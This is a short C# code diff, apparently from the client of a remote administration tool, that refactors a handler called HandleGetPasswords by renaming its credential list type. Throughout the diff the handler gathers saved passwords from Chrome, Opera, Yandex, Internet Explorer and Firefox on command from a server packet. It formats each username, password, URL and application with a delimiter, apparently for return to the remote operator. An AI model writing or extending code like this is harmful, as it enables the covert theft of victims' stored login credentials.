@@ -9,6 +9,7 @@ using xClient.Core.Networking;
 using xClient.Core.Utilities;
 using xClient.Enums;
 using System.Collections.Generic;
+using xClient.Core.Data;
 using xClient.Core.Recovery.Browsers;
 
 namespace xClient.Core.Commands
@@ -18,17 +19,17 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetPasswords(Packets.ServerPackets.GetPasswords packet, Client client)
         {
-            List<LoginInfo> mainList = new List<LoginInfo>();
-            
-            mainList.AddRange(Chrome.GetSavedPasswords());
-            mainList.AddRange(Opera.GetSavedPasswords());
-            mainList.AddRange(Yandex.GetSavedPasswords());
-            mainList.AddRange(InternetExplorer.GetSavedPasswords());
-            mainList.AddRange(Firefox.GetSavedPasswords());
+            List<RecoveredAccount> recovered = new List<RecoveredAccount>();
+
+            recovered.AddRange(Chrome.GetSavedPasswords());
+            recovered.AddRange(Opera.GetSavedPasswords());
+            recovered.AddRange(Yandex.GetSavedPasswords());
+            recovered.AddRange(InternetExplorer.GetSavedPasswords());
+            recovered.AddRange(Firefox.GetSavedPasswords());
 
             List<string> raw = new List<string>();
 
-            foreach (LoginInfo value in mainList)
+            foreach (RecoveredAccount value in recovered)
             {
                 string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
                 raw.Add(rawValue);
